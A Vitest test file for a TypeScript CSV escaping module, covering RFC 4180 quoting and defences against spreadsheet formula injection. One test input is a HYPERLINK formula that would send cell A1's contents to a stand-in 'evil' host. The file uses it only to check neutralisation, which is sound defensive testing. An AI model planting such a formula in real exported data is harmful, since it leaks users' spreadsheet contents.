import { describe, it, expect } from 'vitest';
import fc from 'fast-check';
import { csvEscape, csvRow } from './csv';

describe('csvEscape', () => {
  it('returns empty string for null and undefined', () => {
    expect(csvEscape(null)).toBe('');
    expect(csvEscape(undefined)).toBe('');
  });

  it('returns plain values unwrapped when no special characters', () => {
    expect(csvEscape('hello')).toBe('hello');
    expect(csvEscape(42)).toBe('42');
    expect(csvEscape(true)).toBe('true');
  });

  it('wraps values containing commas', () => {
    expect(csvEscape('Manila, Philippines')).toBe('"Manila, Philippines"');
  });

  it('wraps values containing CR or LF', () => {
    expect(csvEscape('line1\nline2')).toBe('"line1\nline2"');
    expect(csvEscape('line1\r\nline2')).toBe('"line1\r\nline2"');
  });

  it('doubles internal quotes and wraps the value', () => {
    expect(csvEscape('she said "hi"')).toBe('"she said ""hi"""');
  });

  it('coerces non-string non-null values via String()', () => {
    expect(csvEscape(0)).toBe('0');
    expect(csvEscape(false)).toBe('false');
  });
});

describe('csvEscape — formula-injection neutralization (CWE-1236)', () => {
  it('prefixes a single quote for each formula trigger char', () => {
    expect(csvEscape('=1+1')).toBe("'=1+1");
    expect(csvEscape('+1')).toBe("'+1");
    expect(csvEscape('-1')).toBe("'-1");
    expect(csvEscape('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('neutralizes a malicious HYPERLINK payload and still RFC-quotes the comma', () => {
    const payload = '=HYPERLINK("http://evil/?"&A1,"x")';
    const out = csvEscape(payload);
    // single-quote prefix applied, then the comma forces RFC 4180 quoting
    expect(out).toBe(`"'=HYPERLINK(""http://evil/?""&A1,""x"")"`);
  });

  it('neutralizes triggers hidden behind leading whitespace', () => {
    expect(csvEscape('  =1+1')).toBe("'  =1+1");
  });

  it('neutralizes a leading tab', () => {
    // tab is both a formula trigger and (as a control char it is not in the
    // RFC-quote set, so only the prefix applies)
    expect(csvEscape('\t=1')).toBe("'\t=1");
  });

  it('leaves a trigger char in the middle of a value alone', () => {
    expect(csvEscape('a=b')).toBe('a=b');
    expect(csvEscape('3-tier')).toBe('3-tier');
  });
});

describe('csvRow', () => {
  it('joins escaped fields with commas', () => {
    expect(csvRow(['a', 'b', 'c'])).toBe('a,b,c');
  });

  it('escapes each field independently', () => {
    expect(csvRow(['plain', 'has,comma', 'has"quote'])).toBe('plain,"has,comma","has""quote"');
  });

  it('handles null and undefined as empty fields', () => {
    expect(csvRow(['a', null, undefined, 'd'])).toBe('a,,,d');
  });

  // RFC 4180 round-trip: parse the row back, fields must match what csvEscape
  // wrote. Formula-triggering fields gain a leading single quote, so the
  // expectation mirrors that neutralization rather than the raw input.
  const FORMULA_TRIGGER = /^\s*[=+\-@]|^[\t\r]/;
  const neutralize = (s: string) => (FORMULA_TRIGGER.test(s) ? `'${s}` : s);

  it('round-trips arbitrary string fields through a minimal parser', () => {
    fc.assert(
      fc.property(
        fc.array(fc.string({ minLength: 0, maxLength: 50 }), { minLength: 1, maxLength: 5 }),
        (fields) => {
          const row = csvRow(fields);
          expect(parseRow(row)).toEqual(fields.map(neutralize));
        },
      ),
      { numRuns: 100 },
    );
  });
});

// Minimal RFC 4180 single-row parser used only by the round-trip property test.
function parseRow(row: string): string[] {
  const out: string[] = [];
  let i = 0;
  while (i <= row.length) {
    if (i === row.length) { out.push(''); break; }
    if (row[i] === '"') {
      let val = '';
      i++;
      while (i < row.length) {
        if (row[i] === '"' && row[i + 1] === '"') { val += '"'; i += 2; continue; }
        if (row[i] === '"') { i++; break; }
        val += row[i++];
      }
      out.push(val);
      if (row[i] === ',') i++;
      else if (i >= row.length) break;
    } else {
      let val = '';
      while (i < row.length && row[i] !== ',') val += row[i++];
      out.push(val);
      if (row[i] === ',') i++;
      else break;
    }
  }
  return out;
}
